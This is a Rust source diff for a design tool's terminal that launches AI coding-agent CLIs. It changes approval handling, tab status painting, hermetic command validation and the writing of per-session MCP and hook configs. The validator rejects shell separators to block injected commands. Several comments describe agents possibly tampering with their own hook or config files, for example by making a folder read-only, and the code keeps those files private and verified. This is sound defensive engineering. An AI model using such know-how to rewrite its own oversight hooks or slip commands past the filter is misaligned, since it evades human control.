-                if let Some((next_status, _receipt)) = tab.turn_tracker.on_process_exit(now_secs as f64, &prev_status) {
+                if let Some((next_status, _receipt)) = tab.turn_tracker.on_process_exit(now_secs as f64, &prev_status, was_stopped, process_exit) {
                     if let Ok(mut st) = tab.agent_status.lock() {
                         *st = next_status.clone();
                     }
@@ -3527,12 +4331,8 @@ impl TerminalState {
                 if let Ok(mut parser) = tab.parser.lock() {
                     parser.process("\r\n[design:os] Agent exited — this tab no longer accepts input. Open a new tab to continue.\r\n".as_bytes());
                 }
-                Self::withdraw_tab_approvals(&self.session_dir, tab);
-                if let Ok(mut st) = tab.agent_status.lock() {
-                    if matches!(*st, AgentTabStatus::WaitingForInput(_)) {
-                        *st = AgentTabStatus::Idle;
-                    }
-                }
+                tab.screen_rev.fetch_add(1, std::sync::atomic::Ordering::Release);
+                Self::withdraw_tab_approvals(tab);
                 tab.exited_notice_shown = true;
                 agent_exited = true;
                 stopped_exited |= was_stopped;
@@ -3573,11 +4373,15 @@ impl TerminalState {
             }
         }
 
-        let cli_label = self.active_tab().map(|t| t.preset.button_label()).unwrap_or_else(|| self.active_runtime.button_label());
+        let cli_label = self
+            .approval_banner_target()
+            .map(|(_, preset, _, _, _)| preset.button_label())
+            .or_else(|| self.active_tab().map(|t| t.preset.button_label()))
+            .unwrap_or_else(|| self.active_runtime.button_label());
         let request_key: Option<String> = if let Some(first) = self.pending_approvals.first() {
             Some(first.id.clone())
-        } else if self.needs_approval() {
-            Some("waiting".to_string())
+        } else if let Some((tab_id, _, reqs, _, _)) = self.approval_banner_target() {
+            Some(reqs.first().map(|r| r.id.clone()).unwrap_or_else(|| format!("waiting-{tab_id}")))
         } else {
             None
         };
@@ -3612,7 +4416,7 @@ impl TerminalState {
         out
     }
 
-    /// Selects and reveals the agent tab with `tab_id` when a notification is clicked (`#683` §3.6).
+    /// Selects and reveals the agent tab with `tab_id` when a notification is clicked (`#683` §3.6, `#1195`).
     pub fn focus_tab_by_id(&mut self, tab_id: usize) -> bool {
         let Some(idx) = self.tabs.iter().position(|t| t.id == tab_id) else {
             return false;
@@ -3621,6 +4425,7 @@ impl TerminalState {
         self.tabs[idx].unread = false;
         self.surface_visible = true;
         self.window_focused = true;
+        self.sync_active_tab_approvals();
         true
     }
 
@@ -3660,7 +4465,11 @@ impl TerminalState {
     pub fn dispatch_figma_ai_prompt(&mut self, task_title: &str, cli_prompt: &str, file_path: Option<&Path>) {
         let outcome = self.send_to_agent(cli_prompt, file_path);
         if self.tabs.is_empty() && self.picker_open {
-            self.pending_prompt = Some((task_title.to_string(), cli_prompt.to_string()));
+            // A refusal for the mode keeps the text in the composer: held here too it would be sent a second time later.
+            let kept_in_composer = matches!(outcome, crate::agent_composer::SendOutcome::Refused(crate::agent_composer::RefuseReason::ModeUnavailable));
+            if outcome != crate::agent_composer::SendOutcome::Queued && !kept_in_composer {
+                self.pending_prompt = Some((task_title.to_string(), cli_prompt.to_string()));
+            }
         } else if matches!(outcome, crate::agent_composer::SendOutcome::Written | crate::agent_composer::SendOutcome::Queued) {
             let title = self.active_tab().map(|t| t.title.clone()).unwrap_or_else(|| "Agent".into());
             self.status_msg = Some(format!("Dispatched '{task_title}' to {title} PTY"));
@@ -3678,22 +4487,6 @@ impl TerminalState {
             }
         }
         false
-    }
-
-    /// Pastes a terminal-header `@`-mention pick into the active agent tab (`#655`).
-    /// Closes the popup and reports the pasted label when accepted; keeps the popup open and sets
-    /// `"Nothing sent. Open an agent tab first."` when no agent tab accepted the paste.
-    pub fn handle_terminal_mention_pick(&mut self, mention: &crate::agent_mention::Mention) -> bool {
-        let snippet = crate::agent_mention::format_terminal_paste_mention(mention);
-        if self.paste_into_agent_tab(&snippet) {
-            self.mention_popup.close();
-            self.status_msg = Some(format!("Pasted @{}. Press Enter to send.", mention.label));
-            true
-        } else {
-            self.mention_popup.open = true;
-            self.status_msg = Some("Nothing sent. Open an agent tab first.".to_string());
-            false
-        }
     }
 
     /// Copies the `product-os-spec-driven` block citation to the system clipboard and a session
@@ -4225,89 +5018,6 @@ pub fn paint_custom_terminal_glyph(p: &Painter, cell_rect: Rect, ch: char, fg: C
     true
 }
 
-/// Renders Orca's Dual-Glyph Live Agent Status (`Working` 12fps `theme::INFO` spinner, `WaitingForInput`
-/// `theme::WARNING` ring, `Done` unread `theme::SUCCESS` dot, `Idle`/`Stopped`/read `theme::TEXT_SECONDARY`,
-/// `Error` `theme::DANGER`) + Provider Color Badge (`Claude` `#D97757`, `Codex` `#FAFAFA`, `Grok` `#E4E4E7`,
-/// `Antigravity` `#60A5FA`, `Shell` `>_`) inside a tab rect (`#683` §5).
-fn paint_orca_tab_status_and_provider(ui: &Ui, p: &Painter, tab: &TerminalTab, t_rect: Rect) {
-    let cy = t_rect.center().y;
-    let status_center = Pos2::new(t_rect.left() + 7.5, cy);
-    let provider_center = Pos2::new(t_rect.left() + 15.0, cy);
-
-    let effective_status = tab.effective_status();
-
-    match effective_status {
-        AgentTabStatus::Working(_) => {
-            // Orca 12fps stepped rotating `theme::INFO` arc spinner + 83ms repaint cadence
-            let step = ((ui.input(|i| i.time) * 12.0).floor() as i32).rem_euclid(12);
-            let base_angle = (step as f32) * (std::f32::consts::TAU / 12.0);
-            let arc_span = std::f32::consts::TAU * 0.68;
-            let radius = 3.2f32;
-            let spin_col = theme::INFO;
-            let segs = 7usize;
-            let mut prev = Pos2::new(status_center.x + radius * base_angle.cos(), status_center.y + radius * base_angle.sin());
-            for i in 1..=segs {
-                let a = base_angle + arc_span * (i as f32 / segs as f32);
-                let next = Pos2::new(status_center.x + radius * a.cos(), status_center.y + radius * a.sin());
-                p.line_segment([prev, next], Stroke::new(1.4, spin_col));
-                prev = next;
-            }
-            ui.ctx().request_repaint_after(std::time::Duration::from_millis(83));
-        }
-        AgentTabStatus::WaitingForInput(_) => {
-            let wait_col = theme::WARNING;
-            p.circle_stroke(status_center, 3.1, Stroke::new(1.3, wait_col));
-            p.circle_filled(status_center, 1.2, wait_col);
-        }
-        AgentTabStatus::Done if tab.unread => {
-            p.circle_filled(status_center, 2.7, theme::SUCCESS);
-        }
-        AgentTabStatus::Error(_) => {
-            p.circle_filled(status_center, 2.7, theme::DANGER);
-        }
-        // An exited tab shows a hollow ring, so it never reads as an idle tab, which has the filled dot.
-        AgentTabStatus::Done | AgentTabStatus::Idle | AgentTabStatus::Stopped if tab.exited_notice_shown => {
-            p.circle_stroke(status_center, 3.0, Stroke::new(1.3, theme::TEXT_SECONDARY));
-        }
-        AgentTabStatus::Done | AgentTabStatus::Idle => {
-            p.circle_filled(status_center, 2.7, theme::TEXT_SECONDARY);
-        }
-        AgentTabStatus::Stopped => {
-            p.circle_filled(status_center, 2.7, theme::ICON_TERTIARY);
-        }
-    }
-
-    // Provider Color Badge / Vector Glyph (`Claude` #D97757, `Codex`/`OpenCode` #FAFAFA, `Grok` #E4E4E7, `Antigravity`/`Gemini` #60A5FA, `Shell` `>_`)
-    match tab.preset {
-        AgentCliPreset::Claude => {
-            let col = Color32::from_rgb(0xD9, 0x77, 0x57);
-            p.circle_filled(provider_center, 2.3, col);
-        }
-        AgentCliPreset::Codex | AgentCliPreset::OpenCode => {
-            let col = Color32::from_rgb(0xFA, 0xFA, 0xFA);
-            p.circle_stroke(provider_center, 2.2, Stroke::new(1.2, col));
-        }
-        AgentCliPreset::Grok => {
-            let col = Color32::from_rgb(0xE4, 0xE4, 0xE7);
-            p.line_segment(
-                [Pos2::new(provider_center.x - 2.0, provider_center.y + 2.0), Pos2::new(provider_center.x + 2.0, provider_center.y - 2.0)],
-                Stroke::new(1.4, col),
-            );
-        }
-        AgentCliPreset::Antigravity | AgentCliPreset::Gemini => {
-            let col = Color32::from_rgb(0x60, 0xA5, 0xFA);
-            p.circle_filled(provider_center, 2.3, col);
-        }
-        AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp => {
-            let col = Color32::from_rgb(0xA1, 0xA1, 0xAA);
-            let s = Stroke::new(1.1, col);
-            p.line_segment([Pos2::new(provider_center.x - 2.2, cy - 2.0), Pos2::new(provider_center.x - 0.2, cy)], s);
-            p.line_segment([Pos2::new(provider_center.x - 0.2, cy), Pos2::new(provider_center.x - 2.2, cy + 2.0)], s);
-            p.line_segment([Pos2::new(provider_center.x + 0.6, cy + 2.0), Pos2::new(provider_center.x + 2.6, cy + 2.0)], s);
-        }
-    }
-}
-
 /// Free-function wrapper for [`TerminalState::send_copy_for_ai`].
 #[allow(dead_code)]
 pub fn send_copy_for_ai(state: &mut TerminalState, block_markdown: &str) {
@@ -4362,6 +5072,216 @@ fn isolate_zsh_from_home(cmd: &mut CommandBuilder) {
     cmd.env("ZDOTDIR", &zdotdir);
 }
 
+fn build_shell_preset_cmd(shell_bin: &str) -> CommandBuilder {
+    build_shell_preset_cmd_in(shell_bin, crate::cli_resolve::hermetic_agent_cli_dir().as_deref())
+}
+
+pub(crate) fn build_shell_preset_cmd_in(shell_bin: &str, hermetic_dir: Option<&Path>) -> CommandBuilder {
+    if hermetic_dir.is_some() {
+        return CommandBuilder::new("/bin/sh");
+    }
+    let mut c = CommandBuilder::new(shell_bin);
+    if cfg!(test) {
+        if shell_bin.ends_with("zsh") {
+            c.arg("-d");
+            c.arg("-f");
+            #[cfg(test)]
+            isolate_zsh_from_home(&mut c);
+        } else if shell_bin.ends_with("bash") || shell_bin.ends_with("bash.exe") {
+            c.arg("--norc");
+            c.arg("--noprofile");
+        }
+    } else if !cfg!(windows) {
+        c.arg("-l");
+    }
+    c
+}
+
+fn preset_reachable_with_prepend(preset: AgentCliPreset, path_prepend: &[PathBuf]) -> bool {
+    if preset.is_installed() {
+        return true;
+    }
+    if path_prepend.is_empty() {
+        return false;
+    }
+    let sources = crate::cli_resolve::search_sources_with_prepend(path_prepend);
+    let dirs = crate::cli_resolve::cli_search_dirs_with(&sources);
+    crate::cli_resolve::resolve_in(&dirs, preset.binary_name()).is_some()
+}
+
+fn build_agent_shell_cmd_checked_for_tab(
+    shell_bin: &str,
+    agent_cli: &str,
+    preset: AgentCliPreset,
+    file_path: Option<&Path>,
+    session: Option<&SessionEnv>,
+) -> Result<CommandBuilder, String> {
+    if crate::cli_resolve::hermetic_mode_active() && crate::cli_resolve::hermetic_agent_cli_dir().is_none() {
+        return Err("hermetic mode: startup-validated DESIGNOS_AGENT_CLI_DIR is missing".to_string());
+    }
+    build_agent_shell_cmd_with_session_in(shell_bin, agent_cli, crate::cli_resolve::hermetic_agent_cli_dir().as_deref(), preset, file_path, session)
+}
+
+pub(crate) fn build_agent_shell_cmd_in(shell_bin: &str, agent_cli: &str, hermetic_dir: Option<&Path>) -> Result<CommandBuilder, String> {
+    build_agent_shell_cmd_with_session_in(shell_bin, agent_cli, hermetic_dir, AgentCliPreset::Claude, None, None)
+}
+
+fn build_agent_shell_cmd_with_session_in(
+    shell_bin: &str,
+    agent_cli: &str,
+    hermetic_dir: Option<&Path>,
+    preset: AgentCliPreset,
+    file_path: Option<&Path>,
+    session: Option<&SessionEnv>,
+) -> Result<CommandBuilder, String> {
+    if let Some(dir) = hermetic_dir {
+        let canon_dir = match crate::cli_resolve::hermetic_agent_cli_dir() {
+            Some(pinned) if pinned == dir => pinned,
+            _ => dir
+                .to_str()
+                .ok_or_else(|| "hermetic mode: non-UTF-8 hermetic dir".to_string())
+                .and_then(crate::cli_resolve::validate_and_canonicalize_hermetic_dir)?,
+        };
+        let trimmed = agent_cli.trim_start();
+        let body = trimmed.strip_prefix("exec ").map(str::trim_start).unwrap_or(trimmed);
+        if body.is_empty() {
+            return Err(format!("hermetic mode: refused command {agent_cli}"));
+        }
+        for sep in ["&", "|", ";", "<", ">", "`", "$(", "\n", "\r"] {
+            if body.contains(sep) {
+                return Err(format!("hermetic mode: refused command {agent_cli}"));
+            }
+        }
+        let words = shell_words::split(body).map_err(|e| format!("hermetic mode: refused command {agent_cli} ({e})"))?;
+        let Some((first_word, rest_words)) = words.split_first() else {
+            return Err(format!("hermetic mode: refused command {agent_cli}"));
+        };
+        let is_bare_name = !first_word.is_empty() && !first_word.contains('/') && !first_word.contains('\\') && !first_word.contains('$');
+        if !is_bare_name {
+            return Err(format!("hermetic mode: refused command {first_word}"));
+        }
+        let Some(resolved) = crate::cli_resolve::resolve_in_hermetic(&canon_dir, first_word) else {
+            return Err(format!("hermetic mode: refused command {first_word}"));
+        };
+        let env_map = tab_designos_env_map(preset, file_path, session);
+        let mut expanded_args = Vec::with_capacity(rest_words.len());
+        for word in rest_words {
+            let expanded = expand_hermetic_designos_vars(word, &env_map).map_err(|reason| format!("hermetic mode: refused command {agent_cli} ({reason})"))?;
+            expanded_args.push(expanded);
+        }
+        let mut c = CommandBuilder::new(resolved);
+        c.args(expanded_args);
+        return Ok(c);
+    }
+    Ok(build_agent_shell_cmd(shell_bin, agent_cli))
+}
+
+fn tab_designos_env_map(preset: AgentCliPreset, file_path: Option<&Path>, session: Option<&SessionEnv>) -> std::collections::BTreeMap<String, String> {
+    let mut map = std::collections::BTreeMap::new();
+    let fallback_dir = crate::agent_session_files::ephemeral_session_dir(&tab_session_id(&format!("p{}", std::process::id()), 1));
+    map.insert("DESIGNOS_SESSION_DIR".into(), fallback_dir.to_string_lossy().into_owned());
+    map.insert("DESIGNOS_MCP_CONFIG".into(), fallback_dir.join("mcp-config.json").to_string_lossy().into_owned());
+    map.insert("DESIGNOS_LIVE_DOC_SYNC".into(), fallback_dir.join("doc-sync.designos").to_string_lossy().into_owned());
+    map.insert("DESIGNOS_LIVE_DOC_PATCH".into(), fallback_dir.join("doc-patch.jsonl").to_string_lossy().into_owned());
+    map.insert("DESIGNOS_LIVE_CANVAS".into(), fallback_dir.join("canvas.designos").to_string_lossy().into_owned());
+    map.insert("DESIGNOS_CONTEXT_JSON".into(), fallback_dir.join("context.json").to_string_lossy().into_owned());
+    map.insert("DESIGNOS_TARGET_PAGE_ID".into(), "0".into());
+    map.insert("DESIGNOS_TARGET_PAGE_NAME".into(), "Page 1".into());
+    map.insert("DESIGNOS_DOC_NAME".into(), "Untitled".into());
+
+    // 1. Parent `DESIGNOS_*` environment variables first.
+    for (k, v) in std::env::vars_os() {
+        if let (Some(ks), Some(vs)) = (k.to_str(), v.to_str()) {
+            if ks.starts_with("DESIGNOS_") {
+                map.insert(ks.to_string(), vs.to_string());
+            }
+        }
+    }
+
+    // 2. Values forced by `configure_pty_env` regardless of parent environment.
+    map.insert("DESIGNOS_AGENT_RUNTIME".into(), preset.binary_name().into());
+    map.insert("DESIGNOS_IN_PROGRESS_STALE_MINUTES".into(), designos_doc::in_progress_stale_minutes().to_string());
+    map.insert("DESIGNOS_AGENT_RUN_ID".into(), format!("p{}-tab-1-1-1", std::process::id()));
+    map.insert("DESIGNOS_LIVE_SPEC".into(), fallback_dir.join("live-spec.json").to_string_lossy().into_owned());
+    map.insert("DESIGNOS_SELECTION_JSON".into(), fallback_dir.join("selection.spec.json").to_string_lossy().into_owned());
+    if let Ok(exe) = std::env::current_exe() {
+        map.insert("DESIGNOS_BIN".into(), exe.to_string_lossy().into_owned());
+    }
+    map.insert("DESIGNOS_MCP_BIN".into(), designos_mcp_binary().to_string_lossy().into_owned());
+    if let Some(fp) = file_path {
+        map.insert("DESIGNOS_FILE".into(), fp.to_string_lossy().into_owned());
+    }
+    // An untitled design whose private workspace cannot be made gets an empty folder: `designos-mcp` refuses to start without one, and
+    // a value inherited from the parent never reaches it. The cause is reported by `write_session_agent_files`.
+    map.insert("DESIGNOS_WORKSPACE".into(), session_workspace_dir(file_path).map(|dir| dir.to_string_lossy().into_owned()).unwrap_or_default());
+
+    // 3. Per-tab session overlay.
+    if let Some(sess) = session {
+        map.insert("DESIGNOS_SESSION_DIR".into(), sess.session_dir.to_string_lossy().into_owned());
+        map.insert("DESIGNOS_AGENT_RUN_ID".into(), sess.run_id.clone());
+        map.insert("DESIGNOS_MCP_CONFIG".into(), sess.mcp_config_path.to_string_lossy().into_owned());
+        map.insert("DESIGNOS_LIVE_SPEC".into(), sess.live_spec_path.to_string_lossy().into_owned());
+        map.insert("DESIGNOS_LIVE_DOC_SYNC".into(), sess.live_doc_sync_path.to_string_lossy().into_owned());
+        map.insert("DESIGNOS_LIVE_DOC_PATCH".into(), sess.session_dir.join("doc-patch.jsonl").to_string_lossy().into_owned());
+        map.insert("DESIGNOS_LIVE_CANVAS".into(), sess.live_canvas_path.to_string_lossy().into_owned());
+        map.insert("DESIGNOS_CONTEXT_JSON".into(), sess.context_json_path.to_string_lossy().into_owned());
+        map.insert("DESIGNOS_SELECTION_JSON".into(), sess.selection_spec_path.to_string_lossy().into_owned());
+        map.insert("DESIGNOS_TARGET_PAGE_ID".into(), sess.current_page_id.to_string());
+        map.insert("DESIGNOS_TARGET_PAGE_NAME".into(), sess.current_page_name.clone());
+        map.insert("DESIGNOS_DOC_NAME".into(), sess.doc_name.clone());
+        if let Some(tab_uuid) = sess.tab_session_uuid.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
+            map.insert("DESIGNOS_TAB_SESSION_UUID".into(), tab_uuid.to_string());
+        }
+    }
+    map
+}
+
+fn expand_hermetic_designos_vars(arg: &str, env: &std::collections::BTreeMap<String, String>) -> Result<String, String> {
+    let mut out = String::with_capacity(arg.len());
+    let bytes = arg.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() {
+        if bytes[i] == b'$' {
+            let rest = &arg[i + 1..];
+            if let Some(after_brace) = rest.strip_prefix('{') {
+                let Some(end) = after_brace.find('}') else {
+                    return Err(format!("hermetic mode: unclosed variable expansion in {arg}"));
+                };
+                let name = &after_brace[..end];
+                if !is_valid_designos_var_name(name) {
+                    return Err(format!("hermetic mode: refused variable expansion ${{{name}}}"));
+                }
+                if let Some(val) = env.get(name) {
+                    out.push_str(val);
+                }
+                i += 1 + 1 + end + 1;
+            } else {
+                let end = rest.find(|c: char| !(c.is_ascii_alphanumeric() || c == '_')).unwrap_or(rest.len());
+                let name = &rest[..end];
+                if !is_valid_designos_var_name(name) {
+                    return Err(format!("hermetic mode: refused variable expansion ${name}"));
+                }
+                if let Some(val) = env.get(name) {
+                    out.push_str(val);
+                }
+                i += 1 + end;
+            }
+        } else {
+            let ch = arg[i..].chars().next().unwrap();
+            out.push(ch);
+            i += ch.len_utf8();
+        }
+    }
+    Ok(out)
+}
+
+fn is_valid_designos_var_name(name: &str) -> bool {
+    let Some(suffix) = name.strip_prefix("DESIGNOS_") else {
+        return false;
+    };
+    !suffix.is_empty() && suffix.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+}
+
 fn build_agent_shell_cmd(shell_bin: &str, agent_cli: &str) -> CommandBuilder {
     let mut c = CommandBuilder::new(shell_bin);
     if cfg!(windows) && !shell_bin.ends_with("bash.exe") && !shell_bin.ends_with("sh.exe") {
@@ -4396,10 +5316,12 @@ fn build_agent_shell_cmd(shell_bin: &str, agent_cli: &str) -> CommandBuilder {
 /// makes it discover this plugin for that session only, leaving the user's global agy config untouched.
 fn write_agy_session_plugin(session_dir: &Path, mcp_config_bytes: &[u8]) -> std::io::Result<()> {
     let plugin_dir = session_dir.join(".agents").join("plugins").join("designos");
-    let manifest = br#"{"name":"designos"}"#;
-    atomic_write_session_file(&plugin_dir.join("plugin.json"), manifest)?;
+    atomic_write_session_file(&plugin_dir.join("plugin.json"), AGY_PLUGIN_MANIFEST)?;
     atomic_write_session_file(&plugin_dir.join("mcp_config.json"), mcp_config_bytes)
 }
+
+/// The manifest of the `designos` plugin of an Antigravity session (`plugin.json`).
+const AGY_PLUGIN_MANIFEST: &[u8] = br#"{"name":"designos"}"#;
 
 /// Publishes the session's MCP server config as Gemini CLI's project settings at
 /// `<session_dir>/.gemini/settings.json` plus `<session_dir>/.gemini/trustedFolders.json`
@@ -4414,27 +5336,28 @@ fn write_agy_session_plugin(session_dir: &Path, mcp_config_bytes: &[u8]) -> std:
 /// launched in `Ask` when the mode changes later: the file is shared by the window's tabs and rewritten on every sync.
 /// The folder itself stays trusted in both modes: without it Gemini ignores the project settings and never starts the
 /// server, and `TRUST_FOLDER` adds no allow rule.
-pub fn write_gemini_session_config(session_dir: &Path, mcp_config: &serde_json::Value) {
+///
+/// Gemini loads both files by itself, the server and its hooks included, so each one is read back through the folder's handle
+/// after it is written. A write that fails (an agent made `.gemini` read-only), or a file that does not read back as written,
+/// is an error: a copy an agent kept would run for good.
+pub fn write_gemini_session_config(session_dir: &Path, mcp_config: &serde_json::Value) -> std::io::Result<()> {
     let _argv = build_gemini_mcp_add_argv(mcp_config);
     let mut gemini_cfg = mcp_config.clone();
     // `designos.enabled_tools` is read by `designos-mcp`; Gemini's settings file only takes the server entry.
     if let Some(obj) = gemini_cfg.as_object_mut() {
         obj.remove("designos");
     }
-    if let Ok(bytes) = serde_json::to_vec_pretty(&gemini_cfg) {
-        let settings_path = session_dir.join(".gemini").join("settings.json");
-        let _ = atomic_write_session_file(&settings_path, &bytes);
-    }
+    let settings = serde_json::to_vec_pretty(&gemini_cfg).map_err(invalid_data)?;
 
     let mut trusted = serde_json::Map::new();
     trusted.insert(session_dir.display().to_string(), serde_json::Value::String("TRUST_FOLDER".to_string()));
     if let Ok(canon) = session_dir.canonicalize() {
         trusted.insert(canon.display().to_string(), serde_json::Value::String("TRUST_FOLDER".to_string()));
     }
-    if let Ok(bytes) = serde_json::to_vec_pretty(&serde_json::Value::Object(trusted)) {
-        let trusted_path = session_dir.join(".gemini").join("trustedFolders.json");
-        let _ = atomic_write_session_file(&trusted_path, &bytes);
-    }
+    let trusted = serde_json::to_vec_pretty(&serde_json::Value::Object(trusted)).map_err(invalid_data)?;
+
+    crate::agent_session_files::write_session_file_verified(&session_dir.join(".gemini").join("settings.json"), &settings)?;
+    crate::agent_session_files::write_session_file_verified(&session_dir.join(".gemini").join("trustedFolders.json"), &trusted)
 }
 
 /// Builds the project-scoped `gemini mcp add` argv (`#679` §3 rule 4) using only flags
@@ -4488,7 +5411,14 @@ fn toml_key(k: &str) -> String {
 /// Grok 1.0.62 has no per-session MCP flag; it merges the project layer of its cwd, so the tab is
 /// started with `--cwd <session_dir>` and the user's `~/.grok/config.toml` is never written.
 fn write_grok_session_config(session_dir: &Path, mcp_config: &serde_json::Value) -> std::io::Result<()> {
-    let Some(servers) = mcp_config.get("mcpServers").and_then(|v| v.as_object()) else { return Ok(()) };
+    let Some(toml) = grok_session_config_toml(mcp_config) else { return Ok(()) };
+    atomic_write_session_file(&session_dir.join(".grok").join("config.toml"), toml.as_bytes())
+}
+
+/// The text of Grok's project config for `mcp_config`: its `mcpServers` and nothing else (no plugin, no permission rule). `None`
+/// when `mcp_config` has no `mcpServers`.
+fn grok_session_config_toml(mcp_config: &serde_json::Value) -> Option<String> {
+    let servers = mcp_config.get("mcpServers").and_then(|v| v.as_object())?;
     let mut toml = String::new();
     for (name, server) in servers {
         let key = toml_key(name);
@@ -4511,7 +5441,7 @@ fn write_grok_session_config(session_dir: &Path, mcp_config: &serde_json::Value)
         }
         toml.push('\n');
     }
-    atomic_write_session_file(&session_dir.join(".grok").join("config.toml"), toml.as_bytes())
+    Some(toml)
 }
 
 #[cfg(test)]
@@ -4547,22 +5477,90 @@ fn invalid_data(e: serde_json::Error) -> std::io::Error {
     std::io::Error::new(std::io::ErrorKind::InvalidData, e)
 }
 
-/// Writes `mcp-config.json`, `hooks.json`, `SKILL.md`, `AGENTS.md`, and runtime-specific plugin/hook
-/// files for `job` into `job.session_dir` (`#690` §6).
+/// Writes the MCP config an Ask-mode Claude starts its servers from into the private channel folder `private_dir`: the
+/// session's `mcp_config` with the `designos` server's `DESIGNOS_MCP_CONFIG` pointing at this copy (so the server reads
+/// its enabled tools from it, not from the session folder), owner-only, rewritten at every sync. A failure is reported
+/// and leaves no copy or the previous one: Claude then starts no server, or the one Studio wrote last, and never one
+/// from a file in the session folder.
+fn write_private_claude_mcp_config(private_dir: &Path, mcp_config: &serde_json::Value) {
+    let path = private_dir.join(crate::agent_approval_channel::MCP_CONFIG_FILE_NAME);
+    let mut private_config = mcp_config.clone();
+    if let Some(slot) = private_config.pointer_mut("/mcpServers/designos/env/DESIGNOS_MCP_CONFIG") {
+        *slot = serde_json::Value::String(path.display().to_string());
+    }
+    let written = serde_json::to_vec_pretty(&private_config)
+        .map_err(invalid_data)
+        .and_then(|bytes| crate::agent_approval_channel::write_owner_only_file(&path, &bytes, false));
+    if let Err(e) = written {
+        eprintln!("design:os studio: could not write Claude's MCP config to {}: {e}", path.display());
+    }
+}
+
+/// [`write_session_agent_files`] without what it says about the entries it moved aside.
 pub(crate) fn write_session_agent_files_for_job(job: &crate::agent_session_files::SnapshotJob) -> std::io::Result<()> {
+    write_session_agent_files(job).map(|_| ())
+}
+
+/// Writes `mcp-config.json`, `hooks.json`, `SKILL.md`, `AGENTS.md`, and runtime-specific plugin/hook
+/// files for `job` into `job.session_dir` (`#690` §6). When a tab of Grok or Antigravity is starting in Ask mode (`exact_project_config`),
+/// what the CLI loads from the folder is made exactly Studio's first, and a sentence on what was moved aside comes back. A failure
+/// after entries were moved carries that sentence too, so the line about it names both. An untitled design that has no private workspace
+/// gets no `designos` server; that is not a failed write, so a sentence on it comes back the same way.
+pub(crate) fn write_session_agent_files(job: &crate::agent_session_files::SnapshotJob) -> std::io::Result<Option<String>> {
+    let mut moved_aside = None;
+    write_session_agent_files_noting(job, &mut moved_aside).map_err(|e| match moved_aside {
+        Some(note) => crate::agent_session_files::with_set_aside_note(e, note),
+        None => e,
+    })
+}
+
+/// [`write_session_agent_files`], which leaves in `moved_aside` what it said about the entries it moved aside as soon as it knows,
+/// before a later write can fail.
+fn write_session_agent_files_noting(job: &crate::agent_session_files::SnapshotJob, moved_aside: &mut Option<String>) -> std::io::Result<Option<String>> {
     let mcp_bin = designos_mcp_binary();
-    let workspace_dir = session_workspace_dir(job.file_path.as_deref());
+    // An untitled design whose private workspace cannot be made is given no `designos` server: `designos-mcp` serves the folder it is
+    // given and Studio never names another one in its place. The agent still starts and every file is written, so this is told in a
+    // note for the start line and in the log, not as an error.
+    let workspace = session_workspace_dir(job.file_path.as_deref());
+    let workspace_note = workspace.as_ref().err().map(|e| {
+        // Every sync of the design writes the files again, so the log says it once.
+        static LOGGED: std::sync::Once = std::sync::Once::new();
+        LOGGED.call_once(|| eprintln!("design:os studio: no designos server for this untitled design's agents: {e}"));
+        format!("No design tools in this session: {e}.")
+    });
     let mcp_config_path = job.session_dir.join("mcp-config.json");
+
+    // Ask mode: Claude's MCP config, hooks and skill go to a folder only Studio writes (made first, as the MCP config below
+    // is copied into it). Claude starts the servers of its `--mcp-config` file as commands, and reads the hooks of its
+    // `--settings` file as commands too, so neither may be a file the agent can write. When the folder is not there (no
+    // private data folder, or it cannot be made private) nothing is installed: Claude starts with no MCP server and the
+    // inline settings `{}`.
+    let private_dir = if job.ask_mode {
+        match crate::agent_approval_channel::prepare_channel_dir(&job.session_dir) {
+            Ok(dir) => Some(dir),
+            Err(e) => {
+                eprintln!("design:os studio: in-panel approvals are off for this session, Claude will ask in its terminal: {e}");
+                None
+            }
+        }
+    } else {
+        None
+    };
 
     // The default (every tool) is never written down: an absent `designos` key means "all", so a tool a later
     // build adds is on for sessions that survive an update. A user-edited `enabled_tools` list is kept across
     // each page or selection sync, together with the `known_tools` snapshot that lets new tools be switched on.
-    let existing_config = std::fs::read_to_string(&mcp_config_path).ok();
+    let existing_config = crate::agent_session_files::read_session_text(&mcp_config_path);
     let custom_tools = designos_mcp::rules::reconcile_designos_block(existing_config.as_deref());
 
-    let mut mcp_config = serde_json::json!({
-        "mcpServers": {
-            "designos": {
+    // The server's environment holds ids and paths, and no document or page name: every CLI loads this config by itself,
+    // and `designos-mcp` reads neither name (the tab's shell still has `DESIGNOS_DOC_NAME` and `DESIGNOS_TARGET_PAGE_NAME`).
+    // `DESIGNOS_FILE` is the document's path on disk, which `designos-mcp` needs.
+    let mut servers = serde_json::Map::new();
+    if let Ok(workspace_dir) = &workspace {
+        servers.insert(
+            "designos".into(),
+            serde_json::json!({
                 "command": mcp_bin.display().to_string(),
                 "args": ["--workspace", workspace_dir.display().to_string()],
                 "env": {
@@ -4577,25 +5575,64 @@ pub(crate) fn write_session_agent_files_for_job(job: &crate::agent_session_files
                     "DESIGNOS_LIVE_SPEC": job.live_spec_path.display().to_string(),
                     "DESIGNOS_CONTEXT_JSON": job.context_json_path.display().to_string(),
                     "DESIGNOS_TARGET_PAGE_ID": job.current_page_id.to_string(),
-                    "DESIGNOS_TARGET_PAGE_NAME": job.current_page_name,
-                    "DESIGNOS_DOC_NAME": job.doc_name,
                     "DESIGNOS_FILE": job.file_path.as_ref().map(|p| p.display().to_string()).unwrap_or_default()
                 }
-            }
-        }
-    });
+            }),
+        );
+    }
+    let mut mcp_config = serde_json::json!({ "mcpServers": servers });
     if let (Some(custom), Some(root)) = (&custom_tools, mcp_config.as_object_mut()) {
         root.insert("designos".into(), custom.block.clone());
     }
     let bytes = serde_json::to_vec_pretty(&mcp_config).map_err(invalid_data)?;
     atomic_write_session_file(&mcp_config_path, &bytes)?;
-    write_agy_session_plugin(&job.session_dir, &bytes)?;
-    write_gemini_session_config(&job.session_dir, &mcp_config);
-    write_grok_session_config(&job.session_dir, &mcp_config)?;
+    // The Ask-mode tab of Grok or Antigravity that is about to start gets its project config made exactly Studio's first, so that
+    // is the error the tab reports; the plain writes of that CLI's files below are then skipped.
+    let exact = if job.ask_mode { job.exact_project_config } else { None };
+    // Every hook reports to a folder no agent grant reaches (`agent_hook_outputs`). Without one (no private data folder, or one that
+    // cannot be kept private) no hook that writes or reads a file is installed, and the tabs show no status.
+    let hook_paths = match crate::agent_hook_outputs::HookPaths::prepare(&job.session_dir) {
+        Ok(paths) => Some(paths),
+        Err(e) => {
